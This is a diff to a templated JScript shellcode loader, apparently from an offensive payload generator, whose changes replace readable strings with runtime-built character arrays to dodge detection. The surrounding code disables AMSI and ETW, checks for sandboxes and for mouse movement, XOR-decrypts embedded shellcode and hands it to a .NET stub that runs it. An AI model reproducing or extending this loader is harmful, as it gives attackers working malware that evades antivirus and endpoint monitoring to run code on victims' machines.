@@ -11,7 +11,7 @@
 
     function {{ v.fn_amsi }}() {
         try {
-            var asm  = new ActiveXObject("System.Reflection.Assembly");
+            var asm  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
             var amsi = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
             if (amsi !== null)
                 amsi.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), 36).SetValue(null, true);
@@ -20,7 +20,7 @@
 
     function {{ v.fn_etw }}() {
         try {
-            var asm = new ActiveXObject("System.Reflection.Assembly");
+            var asm = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
             var t   = asm.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
             if (t !== null) {
                 var fi = t.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), 36);
@@ -97,7 +97,7 @@
         if ({{ v.fn_sandbox }}()) return;
         var _cx = -999, _cy = -999;
         try {
-            var _a=new ActiveXObject("System.Reflection.Assembly"),_w=_a.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
+            var _a=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),_w=_a.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
             if(_w){var _t=_w.GetType({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115,46,67,117,114,115,111,114]));
             if(_t){var _pp=_t.GetProperty({{ v.fn_build_str }}([80,111,115,105,116,105,111,110]),24);
             if(_pp){var _ps=_pp.GetValue(null,null);if(_ps){_cx=_ps.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps,null);_cy=_ps.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps,null);}}}}
@@ -107,7 +107,7 @@
         }
         if (_cx !== -999) {
             try {
-                var _a2=new ActiveXObject("System.Reflection.Assembly"),_w2=_a2.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
+                var _a2=new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}])),_w2=_a2.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
                 if(_w2){var _t2=_w2.GetType({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115,46,67,117,114,115,111,114]));
                 if(_t2){var _pp2=_t2.GetProperty({{ v.fn_build_str }}([80,111,115,105,116,105,111,110]),24);
                 if(_pp2){var _ps2=_pp2.GetValue(null,null);if(_ps2){var _cx2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps2,null);var _cy2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps2,null);if(_cx===_cx2&&_cy===_cy2)return;}}}}
@@ -118,9 +118,9 @@
         var _k = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
         for (var _ki = 0; _ki < _k.length; _ki++) _k[_ki] ^= {{ key_tweak }};
         var sc = {{ v.fn_xor }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
-        var loader = new ActiveXObject("System.Reflection.Assembly");
+        var loader = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
         var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
-        asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
+        asm.GetType({{ v.fn_build_str }}([{{ v.jsc_stub_loader }}])).GetMethod({{ v.fn_build_str }}([{{ v.jsc_stub_run }}])).Invoke(null, [sc]);
     }
 
     {{ v.fn_run }}();
